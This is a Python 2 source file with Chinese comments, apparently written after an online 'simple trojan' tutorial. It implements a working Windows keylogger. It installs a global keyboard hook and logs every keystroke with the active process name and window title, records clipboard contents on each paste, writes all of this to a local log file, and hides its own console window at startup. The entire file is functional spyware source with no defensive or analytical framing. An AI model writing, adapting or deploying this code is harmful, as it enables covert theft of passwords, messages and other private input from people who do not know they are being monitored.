#coding=utf-8
import sys
reload(sys)
sys.setdefaultencoding('utf-8')
sys.path.append('..')
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import loghelper
import os

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
'''
QQ密码输入框（防键盘钩子）原理分析
https://blog.csdn.net/zhubosa/article/details/51199534

Python编写简易木马程序
https://www.cnblogs.com/deen-/p/7039668.html
'''


def get_current_process(logger):

    # 获取最上层的窗口句柄
    hwnd = user32.GetForegroundWindow()

    # 获取进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd,byref(pid))

    # 将进程ID存入变量中
    process_id = "%d" % pid.value

    # 申请内存
    executable = create_string_buffer("\x00"*512)
    h_process = kernel32.OpenProcess(0x400 | 0x10,False,pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # 读取窗口标题
    windows_title = create_string_buffer("\x00"*512)
    length = user32.GetWindowTextA(hwnd,byref(windows_title),512)

    # 打印
    msg = "[ PID:%s-%s-%s]" % (process_id,executable.value,windows_title.value)
    print msg
    logger.info(msg)

    # 关闭handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

# 定义击键监听事件函数
def KeyStroke(event):
    logger = loghelper.get_logger(__name__,r"D:\DB\keylog.txt")
    global current_window
    logger.info(u"# 检测目标窗口是否转移(换了其他窗口就监听新的窗口)")

    # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)
    if event.WindowName != current_window:
        current_window = event.WindowName
        # 函数调用
        get_current_process(logger)

    # 检测击键是否常规按键（非组合键等）
    if event.Ascii > 32 and event.Ascii <127:
        print chr(event.Ascii),
    else:
        # 如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            msg= "[PASTE]-%s" % (pasted_value),
        else:
            msg= "[%s]" % event.Key,
        print msg
        logger.info(msg)
    # 循环监听下一个击键事件
    return True

def key_log():
    # 创建并注册hook管理器
    kl = pyHook.HookManager()
    kl.KeyDown = KeyStroke

    # 注册hook并执行
    kl.HookKeyboard()
    pythoncom.PumpMessages()

if __name__=='__main__':
    import ctypes
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)
        ctypes.windll.kernel32.CloseHandle(whnd)
        key_log()
